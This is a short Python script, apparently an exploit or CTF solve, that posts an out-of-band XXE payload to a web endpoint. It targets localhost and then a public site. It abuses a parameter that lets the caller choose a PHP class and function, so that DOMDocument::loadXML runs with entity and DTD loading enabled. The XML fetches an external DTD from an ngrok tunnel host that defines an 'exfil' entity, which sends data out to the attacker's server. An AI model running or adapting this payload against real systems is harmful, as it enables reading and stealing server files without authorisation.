import requests

# URL do endpoint
url = "http://localhost:8080/"
url = "https://unhide.app/"

malicious_xml = '''<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY % loadDtd SYSTEM "https://f11b-187-110-209-74.ngrok-free.app/oob_xxe.dtb">
    %loadDtd;
    %stack;
    %exfil;
]>
<root>&exfil;</root>'''

data = {
    "classe": "DOMDocument",
    "funcao": "loadXML",
    "arg": [malicious_xml, 6]
}

response = requests.post(url, json=data)